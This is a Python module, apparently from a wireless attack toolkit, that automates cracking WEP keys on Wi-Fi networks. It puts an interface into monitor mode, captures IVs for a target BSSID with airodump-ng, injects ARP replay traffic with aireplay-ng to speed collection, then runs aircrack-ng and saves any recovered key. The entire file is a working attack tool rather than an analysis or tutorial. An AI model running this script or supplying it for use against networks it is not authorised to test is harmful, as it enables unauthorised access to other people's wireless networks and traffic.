"""WEP cracking: airodump-ng IV collection + optional ARP replay + aircrack-ng."""

import asyncio
import csv
import os
from pathlib import Path

from core.exec_utils import run_command, validate_mac, validate_channel
from core.hardware import start_monitor_mode, stop_monitor_mode, track_process
from core.models import save_result
from core.display import console, info, ok, warn, err, header, make_progress

CAPTURE_DIR = Path("captures")


_last_iv_mtime: float = 0.0
_last_iv_count: int = 0


def _extract_iv_count(csv_path: str, target_bssid: str) -> int:
    """Returns the cached IV count if the CSV hasn't changed since the last
    call (airodump-ng fully rewrites this file each --write-interval, so
    mtime is a cheap and correct signal for 'is there new data yet')."""
    global _last_iv_mtime, _last_iv_count
    try:
        mtime = os.path.getmtime(csv_path)
        if mtime == _last_iv_mtime:
            return _last_iv_count
        with open(csv_path) as f:
            content = f.read()
        ap_block = content.split("\n\n")[0].strip()
        ap_lines = [l for l in ap_block.split("\n") if l.strip()]
        if len(ap_lines) < 2:
            return _last_iv_count
        reader = csv.DictReader(ap_lines, skipinitialspace=True)
        for row in reader:
            if row.get("BSSID", "").strip().upper() == target_bssid.upper():
                iv_str = row.get("# IV", "0").strip()
                count = int(iv_str) if iv_str.lstrip("-").isdigit() else _last_iv_count
                _last_iv_mtime = mtime
                _last_iv_count = count
                return count
        _last_iv_mtime = mtime
    except Exception:
        pass
    return _last_iv_count


async def run_wep_crack(
    interface: str, bssid: str, channel: str,
    client_mac: str = "", arp_replay: bool = True, iv_threshold: int = 40000,
) -> None:
    header("WEP Cracking")
    if not validate_mac(bssid):
        err("Invalid BSSID"); return
    if not validate_channel(channel):
        err("Invalid channel"); return

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    mon_iface = await start_monitor_mode(interface)
    ok(f"Monitor mode active on {mon_iface}")

    capture_prefix = CAPTURE_DIR / f"wep_{bssid.replace(':','')}"
    csv_file = str(capture_prefix) + "-01.csv"

    dump_cmd = ["sudo", "airodump-ng", "--bssid", bssid, "-c", channel,
                "--write", str(capture_prefix), "--output-format", "cap,csv",
                "--write-interval", "1", mon_iface]
    dump_proc = await asyncio.create_subprocess_exec(*dump_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    track_process(dump_proc)
    info("Capturing IVs...")

    inject_proc = None
    if arp_replay:
        replay_cmd = ["sudo", "aireplay-ng", "-3", "-b", bssid,
                      "-h", client_mac if client_mac else "FF:FF:FF:FF:FF:FF", mon_iface]
        inject_proc = await asyncio.create_subprocess_exec(*replay_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        track_process(inject_proc)
        info("ARP replay injection running...")

    try:
        with make_progress() as progress:
            task = progress.add_task(f"IVs collected (target {iv_threshold})", total=iv_threshold)
            while True:
                if os.path.exists(csv_file):
                    ivs = _extract_iv_count(csv_file, bssid)
                    progress.update(task, completed=min(ivs, iv_threshold))
                    if ivs >= iv_threshold:
                        break
                await asyncio.sleep(1)
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("Stopped before threshold reached — attempting crack with what was captured.")
    finally:
        for p in (inject_proc, dump_proc):
            if p and p.returncode is None:
                p.terminate()
                try:
                    await p.wait()
                except Exception:
                    pass

    cap_file = Path(str(capture_prefix) + "-01.cap")
    if not cap_file.exists():
        await stop_monitor_mode(mon_iface)
        err("Capture file missing — nothing to crack.")
        return

    info("Running aircrack-ng...")
    try:
        result = await asyncio.wait_for(
            run_command(["sudo", "aircrack-ng", "-b", bssid, str(cap_file)]),
            timeout=300,
        )
    except asyncio.TimeoutError:
        await stop_monitor_mode(mon_iface)
        err("aircrack-ng timed out after 300s.")
        return

    await stop_monitor_mode(mon_iface)

    if "KEY FOUND" in result:
        key_line = [l for l in result.splitlines() if "KEY FOUND" in l][0]
        try:
            key = key_line.split("[")[1].split("]")[0]
        except Exception:
            key = "parse error — see captures/ for raw output"
        ok(f"KEY FOUND: [bold green]{key}[/bold green]")
        save_result(bssid.replace(":", ""), "wep", bssid, "", key, {"cap": str(cap_file)})
    else:
        warn("Key not found in capture. Try collecting more IVs.")
